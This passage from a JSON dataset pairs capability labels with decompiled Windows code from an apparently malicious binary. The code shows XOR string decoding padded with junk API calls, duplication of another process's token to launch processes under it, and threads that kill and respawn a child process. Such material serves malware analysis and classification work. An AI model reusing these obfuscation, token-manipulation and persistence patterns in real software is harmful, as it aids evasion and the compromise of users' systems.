iVar8 = 0;\n                lpType = &var_2ch - iVar3;\n                var_1ch = iVar3;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                    iVar4 = var_54h;\n                    if (iVar5 != 0x3f731e) {\n                        hKey = 6;\n                        *(iVar8 + iVar3) = *(&var_18h + iVar8 % 6) ^ (iVar8 + iVar3)[lpType];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar3, &ARG_0, var_54h);\n                var_1h._0_1_ = '\\0';\n                var_4ch = NULL;\n                var_54h = iVar4 + 1;\n                var_50h = NULL;\n                hKey = fcn.004038f7(0x20019);\n                param_1 = var_5ch;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = NULL;\n                    var_64h = NULL;\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar8 == 0) {\n                        uVar2 = (*pcVar11)(8, lpcbData);\n                        var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        puVar7 = var_64h;\n                        puVar6 = var_64h;\n                        if ((var_60h == NULL) ||\n                           (iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_60h, &lpcbData),  puVar7 = var_60h, \n                           puVar6 = lpcbData,  iVar8 == 0)) {\n                            var_1h._0_1_ = '\\x01';\n                            var_50h = puVar6;\n                            var_4ch = puVar7;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_4ch != NULL)) && (var_50h != NULL)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar11)(8, var_50h);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar11)(0, param_1[1], var_50h + *param_1);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_4ch;\n                        puVar10 = iVar3 + *param_1;\n                        for (puVar7 = var_50h; puVar7 != NULL; puVar7 = puVar7 + -1) {\n                            *puVar10 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar10 = puVar10 + 1;\n                        }\n                        *param_1 = var_50h + *param_1;\n                        pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4ch);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        iVar3 = var_1ch;\n                    }\n                }\n                uVar2 = (*pcVar11)(0, iVar3);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_6ch);\n            uVar2 = (*pcVar11)(0, var_70h);\n            (*pcVar1)(uVar2);\n            iVar3 = var_58h;\n        }\n        uVar2 = (*pcVar11)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2254
    },
    "004047d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004047d4(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "004064d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.004064d2(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint lpCommandLine;\n    int32_t var_b0h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    uint TokenHandle;\n    uint var_54h;\n    int32_t var_50h;\n    uint pSessionId;\n    int32_t var_48h;\n    uint hExistingToken;\n    int32_t *var_40h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hToken;\n    uint var_8h;\n    uint var_4h;\n    \n    var_54h = 4;\n    var_34h._0_2_ = 0x1000;\n    piVar8 = param_2;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    pSessionId = 0;\n    puVar9 = &lpCommandLine;\n    var_40h = param_2;\n    for (iVar6 = 0x44; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hToken = 0;\n    puVar9 = &var_6ch;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hExistingToken = 0;\n    var_30h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (iVar6 != 0) {\n        var_64h = iVar6;\n        iVar2 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar6, 0x201eb, &hExistingToken);\n            if (iVar2 != 0) {\n                fcn.00404e4e();\n                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar2 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar6 != 0) {\n                        var_68h = 0x20;\n                        var_6ch = pSid;\n                        iVar6 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_6ch, iVar6 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_5ch = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_5ch, 4);\n                    iVar6 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_30h, hToken, 1);\n                    if (iVar6 == 0) {\n                        var_30h = 0;\n                    }\n                    else {\n                        var_54h = 0x404;\n                    }\n                    lpCommandLine = 0x44;\n                    var_2ch = 0x655b6a3f;\n                    var_28h = 0x6a3b3117;\n                    var_24h = 0x31186546;\n                    var_20h = 0x656e6a78;\n                    var_1ch = 0x6a2d311d;\n                    var_18h = 0x31186554;\n                    var_14h = 0x655e6a3d;\n                    var_10h = 0x6a48310d;\n                    var_8h = 0x65326a48;\n                    var_4h._0_2_ = 0x3179;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    var_50h = 6;\n                    iVar2 = 0;\n                    var_48h = &var_2ch - iVar6;\n                    var_60h = iVar6;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                        if (iVar4 != 0xd01e69) {\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % var_50h) ^ (iVar2 + iVar6)[var_48h];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x20);\n                    var_24h = 0x6d183732;\n                    var_20h = 0x3729741a;\n                    var_1ch = 0x740a6d01;\n                    var_18h = 0x6d403735;\n                    var_14h = 0x3739741c;\n                    var_10h = 0x74796d0b;\n                    var_8h = 0x6d6e3741;\n                    var_4h._0_2_ = 0x7479;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_48h = &var_24h - iVar6;\n                    do {\n                        iVar5 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                        piVar8 = var_40h;\n                        iVar4 = var_60h;\n                        if (iVar5 != 0x20ccf0) {\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % var_50h) ^ (iVar2 + iVar6)[&var_24h - iVar6];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x18);\n                    var_88h._0_2_ = 0;\n                    var_b0h = var_60h;\n                    var_8ch = 1;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, iVar6, 0, 0, 0, 0, var_54h, var_30h, 0, &lpCommandLine, var_40h);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*piVar8 != 0) {\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*piVar8, 0x201eb, &TokenHandle);\n                        if (iVar2 != 0) {\n                            fcn.00404e4e();\n                            (*pcVar7)(TokenHandle);\n                        }\n                        (*pcVar7)(var_40h[1]);\n                    }\n                    if (var_30h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_30h);\n                    }\n                    (*pcVar7)(hToken);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar1)(uVar3);\n                    param_2 = var_40h;\n                    iVar6 = var_64h;\n                }\n                (*pcVar7)(hExistingToken);\n            }\n        }\n        (*pcVar7)(iVar6);\n    }\n    return *param_2;\n}\n",
        "token_count": 2097
    },
    "004067fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004067fb(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpCommandLine;\n    uint var_98h;\n    uint *var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch = 0x37166e51;\n    iVar5 = 0x44;\n    var_48h = 0x451d7440;\n    puVar6 = param_1;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_44h = 0x6e113943;\n    var_40h = 0x746b3728;\n    puVar6 = &var_98h;\n    var_54h = param_1;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_98h = 0x44;\n    var_3ch = 0x39584501;\n    puVar6 = &lpCommandLine;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_38h = 0x37606e00;\n    var_34h = 0x451d7465;\n    var_30h = 0x6e07394e;\n    var_2ch = 0x745c3731;\n    var_28h = 0x39044503;\n    var_24h = 0x37196e46;\n    var_20h = 0x4518744a;\n    var_1ch = 0x6e1c3954;\n    var_18h = 0x744a372a;\n    var_14h = 0x3919451a;\n    var_10h = 0x373d6e11;\n    var_ch = 0x456e745c;\n    var_8h = 0x37456e74;\n    var_4h._0_1_ = 0x39;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x89);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar2 != 0xcb6863) {\n            var_50h = 5;\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % 5) ^ (iVar5 + iVar4)[&var_4ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpCommandLine, 0x104);\n    puVar6 = var_54h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x800000c, 0, 0, &var_98h, var_54h);\n    if (puVar6[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar6[1]);\n    }\n    uVar1 = *puVar6;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 1028
    },
    "00406964": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00406964(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint lpApplicationName;\n    uint lpCommandLine;\n    int32_t var_a8h;\n    uint var_84h;\n    uint var_80h;\n    uint var_64h;\n    uint var_60h;\n    int32_t *var_5ch;\n    uint var_58h;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    uint var_4ch;\n    uint pSessionId;\n    int32_t var_44h;\n    uint hExistingToken;\n    uint pSid;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t var_8h;\n    uint hToken;\n    \n    var_ch._0_2_ = 0x1000;\n    piVar6 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    puVar7 = &lpCommandLine;\n    var_5ch = param_2;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    pSessionId = 0;\n    puVar7 = &var_64h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_4ch = 0;\n    hToken = 0;\n    hExistingToken = 0;\n    var_8h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (ProcessHandle != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar4 != 0) {\n                fcn.00404e4e();\n                iVar4 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar4 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar5 = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_60h = 0x20;\n                        var_64h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_64h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_58h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_58h, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_8h, hToken, 1);\n                    if (iVar4 == 0) {\n                        var_8h = 0;\n                    }\n                    else {\n                        var_4ch = 0x400;\n                    }\n                    lpCommandLine = 0x44;\n                    var_38h = 0x655b6a3f;\n                    var_34h = 0x6a3b3117;\n                    var_30h = 0x31186546;\n                    var_2ch = 0x656e6a78;\n                    var_28h = 0x6a2d311d;\n                    var_24h = 0x31186554;\n                    var_20h = 0x655e6a3d;\n                    var_1ch = 0x6a48310d;\n                    var_18h = 0x65326a48;\n                    var_14h._0_2_ = 0x3179;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_44h = &var_38h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                        if (iVar3 != 0xd01e69) {\n                            var_44h = 6;\n                            *(iVar5 + iVar4) = *(&var_18h + iVar5 % 6) ^ (iVar5 + iVar4)[&var_38h - iVar4];\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0x20);\n                    var_80h._0_2_ = 0;\n                    var_84h = 1;\n                    var_a8h = iVar4;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, 0x410500, *0x41cd94);\n                    param_2 = var_5ch;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, &lpApplicationName, 0, 0, 0, 0, var_4ch, var_8h, 0, &lpCommandLine, var_5ch);\n                    pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*param_2 != 0) {\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*param_2, 0x201eb, &TokenHandle);\n                        if (iVar5 != 0) {\n                            fcn.00404e4e();\n                            (*pcVar8)(TokenHandle);\n                        }\n                        (*pcVar8)(param_2[1]);\n                    }\n                    if (var_8h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_8h);\n                    }\n                    (*pcVar8)(hToken);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                (*pcVar8)(hExistingToken);\n            }\n        }\n        (*pcVar8)(ProcessHandle);\n    }\n    return *param_2;\n}\n",
        "token_count": 1726
    },
    "00406c0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406c0b(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar2 = 0x44;\n    puVar3 = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = 0x44;\n    puVar3 = &lpCommandLine;\n    for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, 0x410500, *0x41cd94);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 362
    },
    "00406c88": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406c88(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack580;\n    uint32_t uStack576;\n    uint uStack572;\n    uint32_t uStack568;\n    uint32_t uStack564;\n    int32_t iStack552;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack576 = 0;\n    iStack580 = 0;\n    puVar10 = auStack544;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar11 = &uStack568;\n    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    piVar9 = &iStack528;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    if (*0x41cd9c == 0) {\n        *0x41ccb8 = fcn.004067fb();\n        uVar6 = *0x41caac;\n        iVar8 = *0x41caa8;\n    }\n    else {\n        *0x41ccb8 = fcn.004064d2();\n        iVar5 = fcn.0040d9f1(&iStack580);\n        uVar6 = uStack576;\n        iVar8 = iStack580;\n        if (iVar5 != 0) goto code_r0x00406d41;\n    }\n    uStack564 = uVar6 >> 0x1f;\n    uStack568 = uVar6;\n    iStack552 = iVar8;\ncode_r0x00406d41:\n    iVar8 = iStack552;\n    uVar3 = uStack564;\n    uVar6 = uStack568;\n    if (*0x41ccb8 == 0) {\n        piVar9 = &iStack528;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        if (piVar9 - auStack526 >> 1 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar4);\n        }\n    }\n    else {\n        fcn.0040485c();\n        if ((iVar8 != 0) && ((uVar6 | uVar3) != 0)) {\n            fcn.0040d768();\n            fcn.00409240((*0x41cda4 & 1) << 4);\n        }\n        uStack576 = *0x41ccb8;\n        uStack572 = *0x41cda0;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack576, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41ccb8, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00406c88, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n        (*pcVar2)(*0x41ccb8);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 959
    },
    "00406e18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406e18(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uchar *puStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41cd9c == 0) {\n        puStack572 = 0x406e5f;\n        *0x41ccb8 = fcn.00406c0b();\n    }\n    else {\n        puStack572 = 0x406e54;\n        *0x41ccb8 = fcn.00406964();\n    }\n    if (*0x41ccb8 == 0) {\n        piVar6 = &stack0xfffffdf0;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdf2 >> 1 != 0) {\n            puStack572 = &stack0xfffffdf0;\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)();\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        puStack572 = 0x406e73;\n        fcn.0040485c();\n        iStack552 = *0x41ccb8;\n        puStack572 = 0xffffffff;\n        uStack548 = *0x41cda0;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &stack0xfffffdd8, 0);\n        puStack572 = NULL;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(*0x41ccb8, &stack0xfffffdc4);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41ccb8, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00406e18, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41ccb8);\n    }\n    puStack572 = NULL;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 728
    },
    "00406f1e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
